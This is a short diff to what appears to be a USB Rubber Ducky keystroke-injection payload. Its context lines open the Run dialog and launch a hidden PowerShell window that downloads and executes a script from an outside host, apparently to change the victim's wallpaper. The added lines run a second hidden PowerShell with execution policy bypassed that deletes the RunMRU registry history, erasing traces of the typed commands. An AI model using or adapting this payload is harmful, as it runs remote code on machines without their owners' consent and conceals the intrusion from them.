@@ -4,3 +4,6 @@ GUI r
 DELAY 1000
 STRING powershell -windowstyle hidden iex (wget https://judge.sh/wallpaper.php?image=http://s3.amazonaws.com/rapgenius/hotdog.jpg)
 ENTER
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
